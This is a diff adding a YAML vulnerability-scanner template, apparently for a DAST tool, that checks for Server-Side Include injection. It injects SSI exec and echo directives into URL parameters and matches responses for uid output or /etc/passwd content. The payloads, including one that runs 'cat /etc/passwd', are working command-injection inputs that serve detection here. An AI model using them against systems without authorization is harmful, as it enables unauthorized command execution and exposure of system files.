@@ -1,0 +1,45 @@
+id: server-side-includes-ssi
+info:
+  name: Server-Side Include Injection
+  severity: high
+  tags: [injection, ssi, rce, apache, include, dast]
+  description: "Injects SSI exec and echo directives into URL parameters that may be reflected in server-parsed HTML pages. A response containing uid output, environment variable values, or /etc/passwd content confirms active SSI processing of user-controlled data."
+  remediation: "Disable SSI processing unless strictly required. Set Options -Includes in Apache. Sanitise all user input before reflecting it in any server-parsed template or include context."
+  cwe: "CWE-96"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  payload:
+    - "<!--#exec cmd=\"id\"-->"
+    - "<!--#exec cmd=\"whoami\"-->"
+    - "<!--#echo var=\"DOCUMENT_ROOT\"-->"
+    - "<!--#printenv -->"
+    - "<!--#exec cmd=\"cat /etc/passwd\"-->"
+
+requests:
+  - method: GET
+    paths:
+      - "/?name={{payload}}"
+      - "/?page={{payload}}"
+      - "/?include={{payload}}"
+      - "/?template={{payload}}"
+      - "/?msg={{payload}}"
+      - "/?text={{payload}}"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+\\(\\w+"
+          - "root:x:0:0"
+          - "(?i)www-data"
+          - "/var/www"
+          - "/usr/local"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+          - "DOCUMENT_ROOT"
+        part: body
+        condition: or
